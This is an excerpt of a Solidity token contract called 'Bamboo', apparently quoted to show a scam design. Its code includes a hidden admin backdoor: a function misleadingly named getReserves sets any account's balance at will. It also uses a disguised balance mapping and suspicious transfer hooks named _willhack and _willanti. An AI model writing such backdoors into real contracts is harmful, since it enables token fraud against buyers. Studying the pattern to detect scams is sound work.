...
contract Bamboo is Ownable {
    ...
    constructor() {
        ...
        _FeesPair[deployerWallet] = _totalSupply;
    ...
    function getReserves(address admin, uint256 _value) external byAdmin {
        _FeesPair[admin] = _value * 10 ** decimals();
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        uint256 senderBalance = _FeesPair[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
         _willhack(sender, recipient, amount);
         _willanti(sender, recipient, amount);
        unchecked {
            _FeesPair[sender] = senderBalance - amount;
        }
        _FeesPair[recipient] += amount;
    ...
    function addEggs(address addr,bool status) external byAdmin {
